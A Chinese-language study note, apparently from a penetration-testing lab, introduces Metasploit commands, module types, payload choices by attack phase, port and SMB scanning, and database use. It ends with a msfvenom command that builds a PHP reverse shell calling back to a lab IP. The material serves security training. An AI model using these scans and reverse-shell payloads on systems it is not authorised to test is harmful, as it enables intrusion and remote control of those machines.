---
icon: pen-to-square
date: 2025-03-31
tags: 
title: Metasploit
category:
  - 项目
---
## 基础命令
### 启动Metasploit
```
msfconsole          
```
### info
```bash
info
```
可以获得上下文模块信息
#### **📌 总结**

|**信息类型**|**作用**|**示例**|
|---|---|---|
|**Name/Module**|模块名称和路径|`exploit/windows/smb/ms17_010_eternalblue`|
|**Platform/Arch**|兼容性和目标环境|`Windows x64`|
|**Options**|必须/可选参数|`RHOSTS`, `LHOST`|
|**References**|漏洞技术文档|`CVE-2017-0144`|
|**Rank**|模块可靠性评级|`Normal`, `Excellent`|

通过 `info` 命令，你可以高效掌握模块的关键信息，避免盲目配置！ 🚀
### unset 
#### **基本用法**
```bash
unset <选项名称>
```

或取消所有选项：
```bash
unset all
```
### setg

#### ** 基本语法**
```bash
setg <选项名称> <值>
```
全局设置，如果想撤销全局设置可以用unsetg
- setg会被模块内的set覆盖

### search
#### ** 基本语法**


```bash
search [options] <keyword1> [keyword2] ...
```

**常用选项**：

| 选项              | 说明                                                                   | 示例                        |
| --------------- | -------------------------------------------------------------------- | ------------------------- |
| `-h`            | 查看帮助                                                                 | `search -h`               |
| `type:<类型>`     | 按模块类型过滤（`exploit`, `auxiliary`, `post`, `payload`, `encoder`, `nop`） | `search type:exploit`     |
| `name:<名称>`     | 按模块名称搜索                                                              | `search name:eternalblue` |
| `cve:<CVE编号>`   | 按CVE编号搜索                                                             | `search cve:2017-0144`    |
| `platform:<平台>` | 按目标平台搜索（`windows`, `linux`, `android`）                               | `search platform:windows` |
| `author:<作者>`   | 按作者搜索                                                                | `search author:hdm`       |

### msf模块分类
#### 辅助模块
任何支持模块，例如扫描程序、爬网程序和模糊测试程序，都可以在此处找到。

```bash
tree -L 1 auxiliary
```
以树状结构
**输出示例**：

复制
```bash
auxiliary
├── admin
├── analyze
├── client
├── cloud
├── crawler
├── dos
├── fileformat
├── fuzzers
├── gather
├── scanner
├── server
└── sniffer
```
- 这里列出了 `auxiliary` 下所有 **一级子目录**（如 `scanner`、`dos`、`admin` 等），每个目录代表一类辅助模块。
这是虚拟目录，不真实存在

### 编码

编码器将允许您对漏洞利用和有效负载进行编码，希望基于签名的防病毒解决方案可能会错过它们。
### 规避
虽然编码器将对有效负载进行编码，但不应将其视为逃避防病毒软件的直接尝试。另一方面，“闪避”模块会尝试这一点，或多或少会成功。  


```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/ evasion/ 
└── windows 
├── applocker_evasion_install_util.rb 
├── applocker_evasion_msbuild.rb 
├── applocker_evasion_presentationhost.rb 
├── applocker_evasion_regasm_regsvcs.rb 
├── applocker_evasion_workflow_compiler.rb 
├── process_herpaderping.rb 
├── syscall_inject.rb 
├── windows_defender_exe.rb 
└── windows_defender_js_hta.rb 

1 directory, 9 files
```

### 利用

漏洞利用，按目标系统进行分类。

```markup
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows

20 directories, 4 files
```
### NOP

NOPs （No OPeration） 从字面上看什么也不做。它们在 Intel x86 CPU 系列中具有 0x90，之后 CPU 在一个周期内将不执行任何作。它们通常用作缓冲区，以实现一致的有效载荷大小。


```markup
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
nops/
├── aarch64
├── armle
├── cmd
├── mipsbe
├── php
├── ppc
├── sparc
├── tty
├── x64
└── x86

10 directories, 0 files
```
### payload

有效负载是将在目标系统上运行的代码。
发送不同有效负载的能力，这些有效负载可以在目标系统上打开 shell。
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
payloads/
├── adapters
├── singles
├── stagers
└── stages
```
#### **📌 权限与Payload选择总结**

| **权限阶段** | **目标**         | **典型Payload**                          |
| -------- | -------------- | -------------------------------------- |
| **初始利用** | 获取任何执行权限       | `reverse_tcp`, `web_delivery`          |
| **提权**   | 升级到SYSTEM/root | `bypassuac`, `local_exploit`           |
| **持久化**  | 维持长期访问         | `persistence`, `service_payload`       |
| **横向移动** | 控制内网其他主机       | `psexec`, `ssh_login`                  |
| **后渗透**  | 数据窃取/高级控制      | `meterpreter` + 扩展（`kiwi`, `mimikatz`） |
|          |                |                                        |
### POST

Post 模块将在上面列出的渗透测试过程的最后阶段，即开发后非常有用，即搜刮财物
## 端口扫描
Metasploit拥有许多扫描端口的模块
Metasploit 具有许多模块，用于扫描目标系统和网络上的开放端口。你 可以使用命令列出可用的潜在端口扫描模块。`search portscan`
```shell-session
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


Interact with a module by name or index, for example use 7 or use auxiliary/scanner/sap/sap_router_portscanner

msf6 >
```
同样也可以用show option进行设置
端口扫描模块将要求您设置几个选项：

端口扫描选项

```shell-session
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
```
- **并发(**CONCURRENCY**)：** 要同时扫描的目标数。
- **端口(ports)：** 要扫描的端口范围。请注意，这里的 1-1000 与使用 Nmap 和 default 配置。Nmap 将扫描 1000 个最常用的端口，而 Metasploit 将从 1 个开始扫描端口号 设置为 10000。
- **主机(RHOSTS)：**要扫描的目标或目标网络。
- **线程(THREADS)：**将同时使用的线程数。线程越多，扫描速度就越快。
### UDP扫描
`scanner/discovery/udp_sweep`提供了快速扫描通过UDP运行的服务，这个模块不会扫描所有的UDP服务，但提供了一种快苏轼别DNS或NetBIOS等UDP服务的方法

### SMB扫描
SMB1存在永恒之蓝漏洞，Metasploit提供了几个有用的辅助模块，允许我们扫描特定协议的服务例如SMB模块(`scanner/smb/smb_version`)，这在一些企业中会成为有价值的攻击目标
- NetBIOS服务也具有价值

### 数据库功能
在实际渗透中可能有多个目标，为了简化操作流程，Metasploit支持用数据库对多个目标进行配置管理，先启用数据库
`root@attackbox:~# systemctl start postgresql`
然后初始化Metasploit数据库


可以使用nmap数据库与其他模块进行交互
1. **先使用 `db_nmap` 扫描网络**，获取开放的 445 端口的主机信息。
    
2. **再使用 `auxiliary/scanner/smb/smb_ms17_010` 模块**，针对开放 445 端口的主机进行 MS17-010 漏洞扫描。
具体操作
先用db_nmap扫描端口并输入到数据库、
然后hosts -R从数据库中设置目标host

services查看数nmap据库中的服务信息

漏洞思路
- HTTP：可能托管一个 Web 应用程序，您可以在其中发现 SQL 注入或远程代码执行 （RCE） 等漏洞。
- FTP：可以允许匿名登录并提供对有趣文件的访问。
- SMB：可能容易受到 MS17–010 等 SMB 漏洞的攻击
- SSH：可能具有默认或易于猜测的凭据
- RDP：如果使用了弱凭据，则可能容易受到 Bluekeep 的攻击或允许桌面访问。


```bash
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```
这是一个生成php反弹shell的命令